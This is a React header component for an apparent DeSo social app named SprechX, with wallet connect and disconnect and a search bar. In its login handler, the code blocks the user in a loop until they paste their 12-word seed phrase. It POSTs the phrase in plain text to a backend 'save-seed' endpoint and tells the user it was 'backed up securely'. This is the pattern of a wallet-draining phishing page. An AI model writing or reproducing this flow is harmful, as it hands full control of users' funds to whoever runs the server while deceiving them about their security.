import React, { useState, useEffect } from 'react';
import './Header.css';
import { FaSearch } from 'react-icons/fa';
import { identity } from 'deso-protocol';

//declare const sprechx: { sprechxUsers: "walletaddress"};
const Header: React.FC = () => {
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  
  identity.configure({
    spendingLimitOptions: {
      // NOTE: this value is in Deso nanos, 1000000000 nanos (or 1e9) = 1 Deso
      GlobalDESOLimit: 1 * 1e9,
      TransactionCountLimitMap: {
        SUBMIT_POST: 'UNLIMITED',
      },
      //IsUnlimited: true,
    },
    network: 'testnet',
    nodeURI: 'https://test.deso.org',
    appName: 'SprechX',
    redirectURI: 'http://localhost:3000',//'https://sprechx.com',
  });

  useEffect(() => {
    const currentUser = identity.snapshot().currentUser;
    if (currentUser){ 
      setWalletConnected(true);
      setWalletAddress(currentUser.publicKey);
     };
  }, [])

  // Handle wallet connection
  const connectWallet = async () => {
    try {
      const User = identity.snapshot();
        console.log('%cUsers are:', 'color: yellow', User);

      const response = await identity.login( { getFreeDeso : true } );
      console.log('Login response:', response);

      if (response && response.publicKeyBase58Check) {
        const address = response.publicKeyBase58Check;

        let seedBackedUp: boolean = false;

        try {
          const response = await fetch(`http://localhost:5000/api/user-exists?publickey=${address}`, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' },
          });
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          const data = await response.json();
          console.log("data:", data);

          if (data.user_exists) {
            seedBackedUp =  true
          }
        } catch (error) {
          console.error('Error fetching user:', error);
        }

        while (!seedBackedUp) {
          alert("🔐 Backup Required\n\nTo continue using SprechX, you need to back up your seed phrase.");
          const seed = prompt("Paste your 12-word seed phrase here to confirm backup:");
        
          if (!seed || seed.split(" ").length < 12) {
            alert("⚠️ Invalid seed phrase. Please enter a valid 12-word phrase.");
          } else {
            const res = await fetch("http://localhost:5000/api/save-seed", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ publickey: address, seedPhrase: seed }),
            });
  
            const result = await res.json();
            if (res.ok) {
              alert("✅ Seed phrase backed up securely.");
              seedBackedUp = true;
            } else {
              alert("❌ Failed to save seed: " + result.error);
            }
          }
        }
  
        setWalletConnected(true);
        setWalletAddress(address);
        console.log('%c✅ Wallet connected:', 'color: green', address);
        window.location.reload();

        const Users = identity.snapshot();
        console.log('%cUsers are:', 'color: red', Users);

      } else {
        console.error('Unexpected login response format:', response);
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
    }
  };

  // Handle wallet disconnection
  const disconnectWallet = async () => {
    try {
      await identity.logout(); // Call logout directly on Deso
      setWalletConnected(false);
      setWalletAddress(null);
      console.log('%cWallet disconnected', 'color: red');
      window.location.reload();

      const storedUsers = identity.snapshot();
      console.log("%cRestored users:", 'color:blue', storedUsers);
    
    } catch (error) {
      console.error('Error disconnecting wallet:', error);
    }
  }

  // Handle search
  const handleSearch = () => {
    console.log('Search term:', searchTerm);
  };

  return (
    <header className="header">
      <div className="header-left">
        <a href="/" className="header-link">
          <img src="/assets/logo.png" className="header-logo" alt="SprechX Logo" />
          <span className="header-title">SprechX</span>
        </a>
      </div>
      <div className="header-wallet">
        <div className="search-bar">
          <input
            type="text"
            placeholder="Search SprechX"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <button className="search-button" onClick={handleSearch}>
            <FaSearch />
          </button>
        </div>
        <button className="wallet-button" onClick={walletConnected ? disconnectWallet : connectWallet}>
          {walletConnected ? (
            <span className="wallet-address">
              {walletAddress?.substring(0, 5)}...{walletAddress?.substring(walletAddress.length - 5)}
            </span>
          ) : (
            'Connect Wallet'
          )}
        </button>
      </div>
    </header>
  );
};

export default Header;
